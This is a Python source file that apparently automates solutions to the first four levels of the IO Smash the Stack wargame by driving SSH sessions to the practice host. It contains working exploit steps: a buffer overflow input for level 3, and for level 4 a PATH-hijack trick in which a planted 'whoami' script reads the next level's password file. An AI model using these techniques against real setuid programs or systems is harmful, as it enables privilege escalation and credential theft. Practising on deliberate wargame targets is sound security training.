"""Solver and level solutions for IO Smash the Stack levels.
"""
from common import solver


class IoSolver(solver.Solver):
  def __init__(self):
    super(IoSolver, self).__init__(
      hostname='io.smashthestack.org',
      initial_password='level1',
      first_level=1,
      check_host_key=False)

  def get_username(self, level_num):
    return 'level%d' % level_num

  def get_password_path(self, level_num):
    return '/home/level%d/.pass' % level_num

  def get_level_solution(self, level_num):
    return globals()['level%d' % level_num]


def level1(proc):
  proc.sendline('/levels/level01')
  proc.expect('enter: ')
  proc.sendline('271')


def level2(proc):
  proc.sendline('/levels/level02_alt NaN')


def level3(proc):
  proc.sendline('/levels/level03 ' + (76 * 'a' + 't'))


def level4(proc):
  # Navigate to a writable directory
  # The date is used so subsequent runs do not use the same directory
  proc.sendline('__writable_dir="/tmp/$(date --rfc-3339=seconds)"'
                '&& mkdir -p "$__writable_dir"'
                '&& cd "$__writable_dir"')
  proc.expect(r'\$ ')

  # Create and execute the controlled whoami executable
  proc.sendline('echo "cat /home/level5/.pass" > whoami '
                '&& chmod +x whoami '
                '&& export PATH=.:$PATH '
                '&& /levels/level04')
  proc.expect('Welcome ')
  proc.expect(r'\$ ')
  return proc.before.splitlines()[0]
